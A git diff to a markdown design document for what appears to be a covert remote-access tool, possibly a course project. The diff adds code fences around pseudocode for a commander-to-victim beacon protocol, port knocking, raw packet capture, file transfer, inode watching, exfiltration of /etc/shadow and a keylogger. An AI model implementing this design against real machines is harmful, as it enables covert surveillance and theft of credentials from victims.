@@ -95,6 +95,7 @@ Code section is 8 bits long and can take the following values where each value i
 | InvalidPktCode         | Victim sends this packet if the commander’s packet passes the checksum validation, but there is something wrong with it. |
 
 ##### Beacon Protocol Pseudocode: Common Functionality 
+```
 TYPE Beacon{
 	Code: 4-bits
 	Options: 12-bits
@@ -145,8 +146,9 @@ IF VictimBeacon.Code != CommanderBeacon.Code:
 	victimPort =  VictimBeacon.Port
 handleOperationOverTCPCommander(operationCode, commanderPort, victimPort)
 }
-
+```
 ##### Beacon Protocol Pseudocode: Victim Functionality 
+```
 FOR every packet received on wire{
 	IF packet not from commander’s MAC, IP, and Port:
 		continue 
@@ -168,8 +170,10 @@ STOP previous operation if any
 WAIT a few seconds for commander to catch up
 handleOperationOverTCPVictim(operationCode, commanderPort, victimPort)
 }
+```
 
 ##### Port Knocking Pseudocode: Commander 
+```
 Send TCP SYN packet to victim IPv4 on port 6000
 Wait for one second
 Send TCP SYN packet to victim IPv4 on port 7000
@@ -178,9 +182,10 @@ Wait for one second
 Wait for one second
 Send TCP SYN packet to victim IPv4 on port 6000
 Wait for one second
-
+```
 
 ##### Port Knocking Pseudocode: Victim
+```
 FOR true{
 Sniff for a TCP SYN packet originating from commander’s IPv4 and port an destined for port 6000
 Sniff for a TCP SYN packet originating from commander’s IPv4 and port an destined for port 7000 for thirty seconds
@@ -195,6 +200,7 @@ IF timed out:
 ELSE:
 break
 }
+```
 
 #### Networking
 ##### Receiver Component Finite State Machine
@@ -211,7 +217,7 @@ break
 | SenderOutput     | The response the **Sender Component** produces upon sending an outbound packet. It contains an error if one encountered, and a flag that tells whether the error encountered is recoverable or not. If the error encountered is not a recoverable error, the whole system must shutdown. |
 | ReceiverParams   | The parameters the **Receiver Component** needs to function. It includes a Route type, and an object that facilitates communication with the **Controller Component**.                                                                 |
 | SenderParams     | The parameters the **Sender Component** needs to function. It includes a Route type, and an object that facilitates communication with the **Controller Component**.                                                                 |
-
+```
 type Route{
     Iface: Network adaptor of host.
     SrcMAC: MAC address of of network adaptor of host
@@ -233,10 +239,10 @@ type SenderOutput{
 	Error: Error encountered
 	Recoverable: boolean
 }
-
+```
 
 ##### Receiver Component Pseudocode
-
+```
 BPFFilter = “ip and tcp and src host Route.DstIP and dst host Route.SrcIP and src port Route.DstIP and dst port Roue.SrcIP and ip[4:2] != 0 and “
 IF is commander:
 	BPFFilter += “(tcp[13] = 0x14 and tcp[8:4] != 0)”
@@ -264,8 +270,9 @@ ELSE:
 	ReceiverOutput.IPv4 = IPv4
 	ReceiverOutput.TCP = TCP 
 	return ReceiverOutput
-
+```
 ##### Sender Component Pseudocode
+```
 FOR each partial packet from the Controller:
 	auto-fill empty fields
 	stack Ethernet, IPv4, and TCP layers
@@ -276,7 +283,7 @@ FOR each partial packet from the Controller:
 		return SenderOutput
 	ELSE:
 		return SenderOutput
-		
+```		
 	
 #### File Watching and File Transfer 
 ##### File Transfer Pseudocode Finite State Machine: Send File
@@ -300,6 +307,7 @@ FOR each partial packet from the Controller:
 | FileHeader   | Stores Metadata about a file that is sent before the actual file content during a file transfer. It contains the name and size of the file.              |
 | EventHeader  | A structure that represents a single inode change. It includes inotify Event, size of the inode, and a flag telling whether the inode is a directory or a file. |
 
+```
 type FileHeader{
 	Name: string
 	Size: 64-bit integer
@@ -310,8 +318,10 @@ type EventHeader{
 	Size: 64-bit integer
 	IsDirectory: boolean
 }
+```
 
 ##### Common Network Transfer Pseudocode
+```
 FUNCTION netWrite(TCPConnection, Object){
 	ObjectJSONBytes = convertToJSONBytes(Object)
 	IF failed:
@@ -338,8 +348,9 @@ IF failed:
 		return Error
 	return Object
 }
-
+```
 ##### File Transfer Pseudocode
+```
 FUNCTION sendFile(TCPConnection, path){
 	IF path is directory:
 return Error
@@ -366,8 +377,9 @@ FUNCTION receiveFile(TCPConnection, parentDirectoryPath){
 	IF failed:
 		return Error
 }
-
+```
 ##### Inode Watching Pseudocode: Victim
+```
 FUNCTION watchInodeVictim(TCPConnection){
 	inodePath = netRead(TCPConnection) 
 	If failed:
@@ -393,8 +405,9 @@ copyAllFileBytes(TCPConnection, path)
 IF failed:
 	return Error
 }
-
+```
 ##### Inode Watching Pseudocode: Commander
+```
 FUNCTION watchInodeCommander(TCPConnection, watchPath,  parentDirectoryPath){
 	netWrite(TCPConnection, watchPath)
 IF failed:
@@ -418,8 +431,9 @@ Print(EventHeader.Event)
 		}
 }
 }
-
+```
 ##### Inode Watching Pseudocode: Shadow File
+```
 processShadowFileVictim(){
 previousHash = ComputeHash(“/etc/shadow”)
 FOR every time interval:
@@ -435,12 +449,13 @@ processShadowFileCommander(TCPConnection, parentDirectory){
 	IF failed:
 		return Error	
 }
-
+```
 #### Keylogger
 ##### Keylogger Finite State Machine
 ![Keylogger FSM](./docs/images/18-keylogger-fsm.png)
 
 ##### Keylogger Pseudocode
+```
 FUNCTION findKeyboardDevices(){
 	keyboardDevices  = emptyList
 	FOR every file under /sys/class/input/ directory:
@@ -466,7 +481,7 @@ FUNCTION logKeyStroke(keylogBuffer){
 				IF failed:
 					return Error
 }
-
+```
 #### Command Line Interface
 ##### Command Line Interface Finite State Machine 
 ![Command-line FSM](./docs/images/19-command-line-fsm.png)
